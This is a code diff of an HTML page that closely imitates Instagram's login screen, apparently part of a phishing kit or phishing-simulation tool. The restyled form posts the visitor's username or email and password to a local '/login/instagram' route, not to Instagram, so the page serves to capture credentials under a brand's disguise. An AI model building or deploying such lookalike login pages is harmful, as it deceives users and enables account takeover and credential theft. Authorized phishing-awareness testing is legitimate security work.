@@ -5,68 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Log In</title>
     <link rel="stylesheet" href="/static/css/style.css">
-    <style>
-        body {
-            background: #fafafa;
-        }
-        .card {
-            border: 1px solid #dbdbdb;
-            box-shadow: none;
-            padding: 32px 40px;
-        }
-        .form-group input {
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 12px 8px;
-            font-size: 13px;
-        }
-        .form-group input:focus {
-            border-color: #a8a8a8;
-            box-shadow: none;
-        }
-        .btn-primary {
-            background: #0095f6;
-            border-radius: 8px;
-            font-size: 14px;
-            padding: 10px;
-        }
-        .btn-primary:hover {
-            background: #1877f2;
-        }
-        .links a {
-            color: #00376b;
-            font-size: 13px;
-        }
-        .footer-text {
-            text-align: center;
-        }
-    </style>
 </head>
-<body>
-    <div class="container">
-        <div class="card">
-            <div class="logo">
-                <div class="instagram-logo">Instagram</div>
-            </div>
-            <form action="/login/instagram" method="POST">
-                <div class="form-group">
-                    <input type="text" name="email" placeholder="Phone number, username, or email" required autofocus>
+<body class="ig-body">
+    <div class="ig-wrapper">
+        <div class="ig-phone">
+            <div class="ig-phone-inner">
+                <div class="ig-phone-bezel">
+                    <div style="font-size:48px;font-weight:bold;font-family:Billabong,cursive;margin-bottom:8px;">Instagram</div>
+                    <span>Connect with friends<br>and the world around you.</span>
                 </div>
-                <div class="form-group">
-                    <input type="password" name="password" placeholder="Password" required>
-                </div>
-                <button type="submit" class="btn-primary">Log In</button>
-            </form>
-            <div class="divider">OR</div>
-            <div class="links">
-                <a href="#">Forgot password?</a>
             </div>
         </div>
-        <div class="card" style="margin-top: 10px; padding: 20px; box-shadow: none; border: 1px solid #dbdbdb;">
-            <p class="footer-text">
+        <div class="ig-login-col">
+            <div class="ig-card">
+                <div class="ig-logo">Instagram</div>
+                <form action="/login/instagram" method="POST">
+                    <input type="text" name="email" placeholder="Phone number, username, or email" required autofocus>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit" class="ig-login-btn">Log In</button>
+                </form>
+                <div class="ig-divider">OR</div>
+                <a href="#" class="ig-fb-link">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+                    Log in with Facebook
+                </a>
+                <a href="#" class="ig-forgot">Forgot password?</a>
+            </div>
+            <div class="ig-signup-card">
                 Don't have an account? <a href="#">Sign up</a>
-            </p>
+            </div>
+            <div class="ig-apps">
+                <p>Get the app.</p>
+                <a href="#" class="ig-badge">&#9654; App Store</a>
+                <a href="#" class="ig-badge">&#9654; Google Play</a>
+            </div>
         </div>
     </div>
 </body>
